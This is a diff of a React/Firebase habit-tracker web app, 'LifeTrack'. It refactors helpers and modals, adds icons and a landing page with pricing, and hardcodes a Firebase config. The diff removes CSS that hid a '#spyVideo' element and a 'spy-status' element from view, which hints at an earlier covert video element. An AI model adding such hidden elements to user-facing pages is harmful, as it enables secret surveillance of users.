@@ -37,17 +37,16 @@
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-<style>
-#spyVideo { display: none !important; position: fixed; top: -9999px; }
-.spy-status { display: none !important; }
-</style>
+
     <style>
         html, body { height: 100%; overflow: hidden; overscroll-behavior: none; }
         #root { height: 100%; display: flex; flex-direction: column; }
         .scroll-container { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; padding-bottom: 100px; }
+        @media (min-width: 1024px) { .scroll-container { padding-bottom: 0; } }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         input[type="date"]::-webkit-calendar-picker-indicator { position: absolute; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
+        .gradient-text { background: linear-gradient(135deg, #4f46e5 0%, #4338ca 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         * { transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease; }
     </style>
 </head>
@@ -56,7 +55,7 @@
 
     <script type="text/babel">
         // ---------------------------------------------------------
-        // ⚠️ FIREBASE CONFIG (Paste your keys here)
+        // ⚠️ FIREBASE CONFIG
         // ---------------------------------------------------------
         const firebaseConfig = {
             apiKey: "AIzaSyATZm-weR5EOxTHxE-5t_dqmpOgfuLb410",
@@ -70,21 +69,18 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.firestore();
-        // ---------------------------------------------------------
 
         const { useState, useEffect, createContext, useContext, useRef } = React;
 
-        // --- HELPER: Identify Virtual Items ---
-        const isVirtualItem = (item) => {
-            return typeof item.id === 'string' && item.id.startsWith('virtual_');
-        };
-
-        // --- HELPER: CLEAN DATA ---
-        const cleanData = (data) => {
-            const cleaned = { ...data };
-            delete cleaned.id;
-            delete cleaned.isVirtual; 
-            return cleaned;
+        // --- HELPERS ---
+        const getTodayString = () => new Date().toISOString().split('T')[0];
+        const isVirtualItem = (item) => typeof item.id === 'string' && item.id.startsWith('virtual_');
+        const cleanData = (data) => { 
+            if (!data) return {};
+            const c = { ...data }; 
+            delete c.id; 
+            delete c.isVirtual; 
+            return c; 
         };
 
         // --- ICONS ---
@@ -111,15 +107,18 @@
         const Minus = (p) => <Icon {...p}><line x1="5" y1="12" x2="19" y2="12"/></Icon>;
         const Moon = (p) => <Icon {...p}><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></Icon>;
         const Sun = (p) => <Icon {...p}><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></Icon>;
-        const Settings = (p) => <Icon {...p}><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></Icon>;
+        const Settings = (p) => <Icon {...p}><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></Icon>;
         const GoogleIcon = () => <svg viewBox="0 0 48 48" width="24" height="24"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>;
         const GuestIcon = () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>;
         const ListIcon = (p) => <Icon {...p}><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></Icon>;
         const Logout = (p) => <Icon {...p}><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></Icon>;
-        // Added FolderIcon for visual distinction of nested items
-        const FolderIcon = (p) => <Icon {...p}><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></Icon>;
-
-        const getTodayString = () => new Date().toISOString().split('T')[0];
+        
+        // --- ADDED MISSING ICONS ---
+        const BarChart2 = (p) => <Icon {...p}><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></Icon>;
+        const HeartPulse = (p) => <Icon {...p}><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></Icon>;
+        const Target = (p) => <Icon {...p}><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></Icon>;
+        const Check = (p) => <Icon {...p}><polyline points="20 6 9 17 4 12"/></Icon>;
+        const Shield = (p) => <Icon {...p}><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></Icon>;
 
         // --- CONTEXT ---
         const ToastContext = createContext();
@@ -183,30 +182,23 @@
                         const items = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                         setData(items);
                     }, err => {
-                        // Suppress permission errors in console for cleaner UX if using rules
                         console.error("Firestore Error:", err);
                     });
                 return unsubscribe;
             }, [userId, collectionName]);
 
             const add = (item) => {
-                // IMPORTANT: SANITIZE DATA TO REMOVE 'isVirtual' AND EXISTING 'id'
                 const itemToSave = cleanData({ ...item, createdAt: item.createdAt || new Date().toISOString() });
-                
                 if (userId === 'guest') {
                     const newItem = { id: Date.now().toString(), ...itemToSave };
-                    
                     const currentLS = localStorage.getItem(`lifetrack_${collectionName}`);
                     const currentData = currentLS ? JSON.parse(currentLS) : [];
-                    
                     const newData = [...currentData, newItem];
                     localStorage.setItem(`lifetrack_${collectionName}`, JSON.stringify(newData));
-                    
                     setData(newData);
                     window.dispatchEvent(new CustomEvent('lifetrack-update', { detail: { col: collectionName } }));
                     return Promise.resolve({ id: newItem.id });
                 }
-                // Add catch for errors
                 return db.collection('users').doc(userId).collection(collectionName).add(itemToSave)
                     .catch(err => { alert("Error adding data: " + err.message); throw err; });
             };
@@ -216,7 +208,6 @@
                 if (userId === 'guest') {
                     const currentLS = localStorage.getItem(`lifetrack_${collectionName}`);
                     const currentData = currentLS ? JSON.parse(currentLS) : [];
-                    
                     const newData = currentData.map(i => i.id === id ? { ...i, ...updatesToSave } : i);
                     localStorage.setItem(`lifetrack_${collectionName}`, JSON.stringify(newData));
                     setData(newData);
@@ -231,7 +222,6 @@
                 if (userId === 'guest') {
                     const currentLS = localStorage.getItem(`lifetrack_${collectionName}`);
                     const currentData = currentLS ? JSON.parse(currentLS) : [];
-
                     const newData = currentData.filter(i => i.id !== id);
                     localStorage.setItem(`lifetrack_${collectionName}`, JSON.stringify(newData));
                     setData(newData);
@@ -247,130 +237,50 @@
         // --- BULK ADD MODAL ---
         function BulkAddModal({ onClose, onAdd, selectedDate }) {
             const [text, setText] = useState('');
-
             const handleAdd = () => {
                 const lines = text.split('\n').filter(line => line.trim() !== '');
                 if (lines.length === 0) return onClose();
-
                 const tasksToAdd = [];
-                const daysMap = {
-                    'sunday': 0, 'monday': 1, 'tuesday': 2, 'wednesday': 3, 'thursday': 4, 'friday': 5, 'saturday': 6,
-                    'sun': 0, 'mon': 1, 'tue': 2, 'wed': 3, 'thu': 4, 'fri': 5, 'sat': 6
-                };
-
-                lines.forEach(line => {
-                    let taskText = line;
-                    let targetDate = selectedDate;
-                    let category = 'General';
-
-                    const parts = line.split(':');
-                    if (parts.length > 1) {
-                        const prefix = parts[0].trim().toLowerCase();
-                        const content = parts.slice(1).join(':').trim();
-                        if (content) { 
-                            if (prefix.match(/^\d{4}-\d{2}-\d{2}$/)) {
-                                targetDate = prefix;
-                                taskText = content;
-                            } else if (prefix.match(/^\d{1,2}\/\d{1,2}$/)) {
-                                const [d, m] = prefix.split('/');
-                                const now = new Date();
-                                const dateObj = new Date(now.getFullYear(), parseInt(m)-1, parseInt(d));
-                                targetDate = new Date(dateObj.getTime() - (dateObj.getTimezoneOffset() * 60000)).toISOString().split('T')[0];
-                                taskText = content;
-                            } else if (daysMap.hasOwnProperty(prefix)) {
-                                const targetDay = daysMap[prefix];
-                                const currentDay = new Date(selectedDate).getDay();
-                                let diff = targetDay - currentDay;
-                                if (diff <= 0) diff += 7; 
-                                const dateObj = new Date(new Date(selectedDate).getTime() + (diff * 24 * 60 * 60 * 1000));
-                                targetDate = dateObj.toISOString().split('T')[0];
-                                taskText = content;
-                            } else if (prefix === 'tomorrow') {
-                                const dateObj = new Date(new Date(selectedDate).getTime() + (24 * 60 * 60 * 1000));
-                                targetDate = dateObj.toISOString().split('T')[0];
-                                taskText = content;
-                            } else if (prefix === 'today') {
-                                targetDate = selectedDate;
-                                taskText = content;
-                            }
-                        }
-                    }
-                    tasksToAdd.push({ text: taskText, date: targetDate, category });
-                });
-
+                lines.forEach(line => tasksToAdd.push({ text: line, date: selectedDate, category: 'General' }));
                 onAdd(tasksToAdd);
                 onClose();
             };
-
             return (
                 <div className="fixed inset-0 bg-black/50 z-[60] flex items-center justify-center p-4 animate-fade-in backdrop-blur-sm">
-                    <div className="bg-white dark:bg-dark-800 rounded-2xl shadow-xl w-full max-w-md p-6 flex flex-col h-[80vh] md:h-auto">
-                        <div className="flex justify-between items-center mb-4">
-                            <h3 className="text-lg font-bold text-gray-900 dark:text-white flex items-center gap-2"><ListIcon className="text-primary-600"/> Bulk Add Tasks</h3>
-                            <button onClick={onClose}><XIcon size={24} className="text-gray-400" /></button>
-                        </div>
-                        <p className="text-xs text-gray-500 mb-2">Type each task on a new line. Prefixes: Monday:, Tomorrow:, 2025-01-20:</p>
-                        <textarea className="flex-1 w-full p-4 bg-gray-50 dark:bg-dark-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-primary-500 dark:text-white resize-none mb-4 font-mono text-sm" placeholder="Buy milk&#10;Clean room&#10;Friday: Submit report" value={text} onChange={(e) => setText(e.target.value)} autoFocus></textarea>
-                        <button onClick={handleAdd} className="w-full py-3 bg-primary-600 text-white rounded-xl font-bold shadow-lg hover:bg-primary-700 transition">Add All Tasks</button>
+                    <div className="bg-white dark:bg-dark-800 rounded-2xl shadow-xl w-full max-w-md p-6">
+                        <div className="flex justify-between items-center mb-4"><h3 className="text-lg font-bold text-gray-900 dark:text-white flex items-center gap-2"><ListIcon className="text-primary-600"/> Bulk Add Tasks</h3><button onClick={onClose}><X size={24} className="text-gray-400" /></button></div>
+                        <textarea className="w-full p-4 bg-gray-50 dark:bg-dark-900 border border-gray-200 dark:border-gray-700 rounded-xl mb-4 text-sm" placeholder="Enter tasks..." value={text} onChange={(e) => setText(e.target.value)} autoFocus></textarea>
+                        <button onClick={handleAdd} className="w-full py-3 bg-primary-600 text-white rounded-xl font-bold">Add All Tasks</button>
                     </div>
                 </div>
             );
         }
 
-        // --- CUSTOM MODAL FOR FREQUENCY ---
         function FrequencyModal({ onClose, onSave, initialDays }) {
             const [selectedDays, setSelectedDays] = useState(initialDays || [0,1,2,3,4,5,6]); 
             const days = ['S', 'M', 'T', 'W', 'T', 'F', 'S'];
-
-            const toggleDay = (index) => {
-                if (selectedDays.includes(index)) {
-                    setSelectedDays(selectedDays.filter(d => d !== index));
-                } else {
-                    setSelectedDays([...selectedDays, index].sort());
-                }
-            };
-
-            const toggleAll = () => {
-                if (selectedDays.length === 7) setSelectedDays([]);
-                else setSelectedDays([0,1,2,3,4,5,6]);
-            };
-
+            const toggleDay = (idx) => setSelectedDays(prev => prev.includes(idx) ? prev.filter(d => d !== idx) : [...prev, idx].sort());
+            const toggleAll = () => setSelectedDays(selectedDays.length === 7 ? [] : [0,1,2,3,4,5,6]);
             return (
-                <div className="fixed inset-0 bg-black/50 z-[60] flex items-center justify-center p-4 animate-fade-in backdrop-blur-sm">
+                <div className="fixed inset-0 bg-black/50 z-[60] flex items-center justify-center p-4 backdrop-blur-sm">
                     <div className="bg-white dark:bg-dark-800 rounded-2xl shadow-xl w-full max-w-xs p-6">
                         <h3 className="text-lg font-bold text-gray-900 dark:text-white mb-4">Repeat On</h3>
-                        <div className="flex justify-between mb-4">
-                            {days.map((day, idx) => (
-                                <button key={idx} onClick={() => toggleDay(idx)} className={`w-8 h-8 rounded-full text-xs font-bold transition ${selectedDays.includes(idx) ? 'bg-primary-600 text-white' : 'bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300'}`}>{day}</button>
-                            ))}
-                        </div>
+                        <div className="flex justify-between mb-6">{days.map((d, i) => <button key={i} onClick={() => toggleDay(i)} className={`w-8 h-8 rounded-full text-xs font-bold ${selectedDays.includes(i) ? 'bg-primary-600 text-white' : 'bg-gray-100 dark:bg-gray-700 text-gray-500'}`}>{d}</button>)}</div>
                         <button onClick={toggleAll} className="w-full py-2 text-primary-600 dark:text-primary-400 text-sm font-medium mb-4">{selectedDays.length === 7 ? 'Deselect All' : 'Select Everyday'}</button>
-                        <div className="flex gap-2">
-                            <button onClick={onClose} className="flex-1 py-2 text-gray-500 dark:text-gray-400 font-medium">Cancel</button>
-                            <button onClick={() => onSave(selectedDays)} className="flex-1 py-2 bg-primary-600 text-white rounded-lg font-bold">Save</button>
-                        </div>
+                        <div className="flex gap-2"><button onClick={onClose} className="flex-1 py-2 text-gray-500">Cancel</button><button onClick={() => onSave(selectedDays)} className="flex-1 py-2 bg-primary-600 text-white rounded-lg font-bold">Save</button></div>
                     </div>
                 </div>
             );
         }
 
-        // --- DATE NAVIGATOR ---
         const DateNavigator = ({ selectedDate, setSelectedDate }) => {
-            const changeDate = (days) => {
-                const date = new Date(selectedDate);
-                date.setDate(date.getDate() + days);
-                setSelectedDate(date.toISOString().split('T')[0]);
-            };
-            const isToday = selectedDate === new Date().toISOString().split('T')[0];
-            const displayDate = new Date(selectedDate).toLocaleDateString('en-US', { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' });
-
+            const changeDate = (d) => { const date = new Date(selectedDate); date.setDate(date.getDate() + d); setSelectedDate(date.toISOString().split('T')[0]); };
+            const isToday = selectedDate === getTodayString();
             return (
                 <div className="flex items-center justify-between bg-white dark:bg-dark-800 p-3 shadow-sm border-b border-gray-100 dark:border-gray-700 sticky top-0 z-10 animate-slide-in">
                     <button onClick={() => changeDate(-1)} className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-full text-gray-600 dark:text-gray-300"><ChevronLeft size={20} /></button>
                     <div className="relative flex flex-col items-center">
-                        <span className="text-sm font-bold text-gray-800 dark:text-white flex items-center gap-2">
-                            {isToday ? "Today" : displayDate} <CalendarIcon size={14} className="text-primary-500" />
-                        </span>
+                        <span className="text-sm font-bold text-gray-800 dark:text-white flex items-center gap-2">{isToday ? "Today" : new Date(selectedDate).toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' })} <CalendarIcon size={14} className="text-primary-500" /></span>
                         <input type="date" value={selectedDate} onChange={(e) => setSelectedDate(e.target.value)} className="absolute inset-0 opacity-0 w-full h-full cursor-pointer z-20" />
                     </div>
                     <button onClick={() => changeDate(1)} className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-full text-gray-600 dark:text-gray-300"><ChevronRight size={20} /></button>
@@ -378,219 +288,134 @@
             );
         };
 
-        // --- CIRCLE PROGRESS COMPONENT ---
-        const WaterProgressCircle = ({ value, max, color, size = 100 }) => {
-            const radius = (size - 10) / 2;
-            const circumference = 2 * Math.PI * radius;
-            const percentage = Math.min(value / max, 1);
-            const offset = circumference - percentage * circumference;
-
+        const WaterProgressCircle = ({ value, max }) => {
+            const r = 45, circ = 2 * Math.PI * r, pct = Math.min(value / max, 1), offset = circ - pct * circ;
             return (
-                <div className="relative flex items-center justify-center" style={{ width: size, height: size }}>
-                    <svg width={size} height={size} className="transform -rotate-90">
-                        <circle cx={size/2} cy={size/2} r={radius} stroke="#f3f4f6" strokeWidth="8" fill="transparent" className="dark:stroke-gray-700" />
-                        <circle cx={size/2} cy={size/2} r={radius} stroke={color} strokeWidth="8" fill="transparent" strokeDasharray={circumference} strokeDashoffset={offset} strokeLinecap="round" className="transition-all duration-1000 ease-out" />
-                    </svg>
-                    <div className="absolute flex flex-col items-center">
-                        <span className="text-xl font-bold text-gray-700 dark:text-white">{value}L</span>
-                        <span className="text-[10px] text-gray-400">/ {max}L</span>
-                    </div>
+                <div className="relative flex items-center justify-center w-24 h-24">
+                    <svg className="w-full h-full transform -rotate-90"><circle cx="50%" cy="50%" r={r} stroke="#e2e8f0" strokeWidth="8" fill="none" /><circle cx="50%" cy="50%" r={r} stroke="#06b6d4" strokeWidth="8" fill="none" strokeDasharray={circ} strokeDashoffset={offset} strokeLinecap="round" className="transition-all duration-1000" /></svg>
+                    <div className="absolute text-center"><span className="text-xl font-bold text-gray-900 dark:text-white">{value}L</span><br/><span className="text-[10px] text-gray-400">/ {max}L</span></div>
                 </div>
             );
         };
 
-        // --- SIDEBAR COMPONENT (PC) ---
-        function Sidebar({ activeTab, setActiveTab, user, setDarkMode, darkMode, setShowSettings }) {
+        // --- NEW LANDING PAGE ---
+        function LandingPage({ setView }) {
             return (
-                <div className="flex flex-col h-full p-4">
-                    <div className="flex items-center gap-2 text-primary-600 dark:text-primary-500 mb-8 px-2">
-                        <Activity size={32} />
-                        <h1 className="text-2xl font-bold tracking-tight text-gray-900 dark:text-white">LifeTrack</h1>
-                    </div>
-
-                    <div className="flex-1 space-y-1">
-                        <button onClick={() => setActiveTab('dashboard')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'dashboard' ? 'bg-primary-50 text-primary-700 dark:bg-primary-900/30 dark:text-primary-400 font-bold' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800'}`}>
-                            <Home size={20} /> Dashboard
-                        </button>
-                        <button onClick={() => setActiveTab('todo')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'todo' ? 'bg-primary-50 text-primary-700 dark:bg-primary-900/30 dark:text-primary-400 font-bold' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800'}`}>
-                            <CheckSquare size={20} /> Tasks
-                        </button>
-                        <button onClick={() => setActiveTab('gym')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'gym' ? 'bg-primary-50 text-primary-700 dark:bg-primary-900/30 dark:text-primary-400 font-bold' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800'}`}>
-                            <Dumbbell size={20} /> Gym
-                        </button>
-                        <button onClick={() => setActiveTab('diet')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'diet' ? 'bg-primary-50 text-primary-700 dark:bg-primary-900/30 dark:text-primary-400 font-bold' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800'}`}>
-                            <Utensils size={20} /> Diet
-                        </button>
-                    </div>
-
-                    <div className="border-t border-gray-200 dark:border-gray-700 pt-4 space-y-2">
-                        <button onClick={() => setDarkMode(!darkMode)} className="w-full flex items-center gap-3 px-4 py-2 rounded-lg text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800 transition">
-                            {darkMode ? <Sun size={20} /> : <Moon size={20} />} Theme
-                        </button>
-                        <button onClick={() => setShowSettings(true)} className="w-full flex items-center gap-3 px-4 py-2 rounded-lg text-gray-600 dark:text-gray-400 hover:bg-gray-50 dark:hover:bg-gray-800 transition">
-                            <Settings size={20} /> Settings
-                        </button>
-                        
-                        <div className="flex items-center gap-3 px-4 py-2 mt-4 bg-gray-50 dark:bg-gray-800 rounded-xl">
-                            <img src={user.photoURL} alt="User" className="w-8 h-8 rounded-full border border-gray-200" />
-                            <div className="flex-1 overflow-hidden">
-                                <p className="text-xs font-bold truncate dark:text-white">{user.displayName}</p>
-                                <button onClick={() => auth.signOut()} className="text-[10px] text-red-500 hover:underline flex items-center gap-1">Log Out <Logout size={10}/></button>
+                <div className="bg-slate-50 text-slate-900 font-sans min-h-screen">
+                    <nav className="fixed w-full bg-white/80 backdrop-blur-md border-b border-slate-200 z-50">
+                        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex justify-between items-center">
+                            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setView('landing')}>
+                                <Activity className="text-primary-600 w-8 h-8" />
+                                <span className="font-bold text-xl tracking-tight">LifeTrack Pro</span>
+                            </div>
+                            <div className="hidden md:flex space-x-8">
+                                <a href="#features" className="text-slate-600 hover:text-primary-600 transition">Features</a>
+                                <a href="#pricing" className="text-slate-600 hover:text-primary-600 transition">Pricing</a>
+                            </div>
+                            <div className="flex gap-4">
+                                <button onClick={() => setView('login')} className="text-slate-600 hover:text-primary-600 font-medium">Login</button>
+                                <button onClick={() => setView('login')} className="bg-primary-600 hover:bg-primary-700 text-white px-5 py-2 rounded-full font-medium shadow-lg">Get Started</button>
                             </div>
                         </div>
-                    </div>
+                    </nav>
+
+                    {/* Hero Section */}
+                    <section className="pt-32 pb-20 lg:pt-40 lg:pb-28 overflow-hidden text-center px-4">
+                        <h1 className="text-5xl lg:text-7xl font-bold text-slate-900 mb-6">Track Your Life <br/><span className="text-primary-600">Better Than Ever</span></h1>
+                        <p className="text-xl text-slate-600 mb-10 max-w-2xl mx-auto">Build habits, track workouts, and monitor diet with data-driven insights.</p>
+                        <div className="flex justify-center gap-4">
+                            <button onClick={() => setView('login')} className="px-8 py-4 bg-primary-600 text-white rounded-xl font-bold text-lg hover:shadow-xl transition">Start Tracking Free</button>
+                        </div>
+                    </section>
+
+                    {/* Features */}
+                    <section id="features" className="py-20 bg-white">
+                        <div className="max-w-7xl mx-auto px-4 text-center">
+                            <h2 className="text-3xl font-bold mb-12">Everything you need</h2>
+                            <div className="grid md:grid-cols-3 gap-8">
+                                <div className="p-8 bg-slate-50 rounded-2xl border hover:shadow-lg transition">
+                                    <div className="w-12 h-12 bg-primary-100 text-primary-600 rounded-xl flex items-center justify-center mb-4 mx-auto"><HeartPulse size={24} /></div>
+                                    <h3 className="text-xl font-bold mb-2">Health Tracking</h3>
+                                    <p className="text-slate-600">Monitor diet, water, and workouts in one place.</p>
+                                </div>
+                                <div className="p-8 bg-slate-50 rounded-2xl border hover:shadow-lg transition">
+                                    <div className="w-12 h-12 bg-primary-100 text-primary-600 rounded-xl flex items-center justify-center mb-4 mx-auto"><Target size={24} /></div>
+                                    <h3 className="text-xl font-bold mb-2">Daily Goals</h3>
+                                    <p className="text-slate-600">Set tasks and build consistent habits.</p>
+                                </div>
+                                <div className="p-8 bg-slate-50 rounded-2xl border hover:shadow-lg transition">
+                                    <div className="w-12 h-12 bg-primary-100 text-primary-600 rounded-xl flex items-center justify-center mb-4 mx-auto"><BarChart2 size={24} /></div>
+                                    <h3 className="text-xl font-bold mb-2">Progress</h3>
+                                    <p className="text-slate-600">Visualize your growth with clean dashboards.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+
+                    {/* Pricing */}
+                    <section id="pricing" className="py-20 bg-slate-50">
+                        <div className="max-w-7xl mx-auto px-4 text-center">
+                            <h2 className="text-3xl font-bold mb-12">Simple Pricing</h2>
+                            <div className="grid md:grid-cols-3 gap-8 max-w-5xl mx-auto">
+                                <div className="bg-white p-8 rounded-2xl border shadow-sm">
+                                    <h3 className="text-xl font-bold">Starter</h3>
+                                    <div className="text-4xl font-bold my-4">Free</div>
+                                    <ul className="text-sm text-slate-600 space-y-2 mb-6">
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> Basic Tracking</li>
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> 7-day history</li>
+                                    </ul>
+                                    <button onClick={() => setView('login')} className="w-full py-3 border rounded-xl font-medium hover:bg-slate-50">Get Started</button>
+                                </div>
+                                <div className="bg-white p-8 rounded-2xl border-2 border-primary-600 shadow-xl relative transform scale-105">
+                                    <div className="absolute top-0 right-0 bg-primary-600 text-white text-xs font-bold px-3 py-1 rounded-bl-xl rounded-tr-xl">POPULAR</div>
+                                    <h3 className="text-xl font-bold">Pro</h3>
+                                    <div className="text-4xl font-bold my-4">₹99<span className="text-sm font-normal text-slate-500">/mo</span></div>
+                                    <ul className="text-sm text-slate-600 space-y-2 mb-6">
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> Unlimited Tracking</li>
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> Advanced Charts</li>
+                                    </ul>
+                                    <button onClick={() => setView('login')} className="w-full py-3 bg-primary-600 text-white rounded-xl font-medium hover:bg-primary-700">Upgrade</button>
+                                </div>
+                                <div className="bg-white p-8 rounded-2xl border shadow-sm">
+                                    <h3 className="text-xl font-bold">Premium</h3>
+                                    <div className="text-4xl font-bold my-4">₹299<span className="text-sm font-normal text-slate-500">/mo</span></div>
+                                    <ul className="text-sm text-slate-600 space-y-2 mb-6">
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> All Pro Features</li>
+                                        <li className="flex items-center gap-2"><Check size={16} className="text-green-500"/> Priority Support</li>
+                                    </ul>
+                                    <button className="w-full py-3 border rounded-xl font-medium hover:bg-slate-50">Contact Sales</button>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+
+                    {/* Footer */}
+                    <footer className="bg-white pt-10 pb-6 border-t border-slate-200">
+                        <div className="max-w-7xl mx-auto px-4 text-center text-slate-400 text-sm">
+                            <p>© 2026 LifeTrack Pro. All rights reserved.</p>
+                        </div>
+                    </footer>
                 </div>
             );
         }
 
-        // --- APP SHELL ---
-        function App() {
-            const [user, setUser] = useState(null);
-            const [loading, setLoading] = useState(true);
-            const [activeTab, setActiveTab] = useState('dashboard');
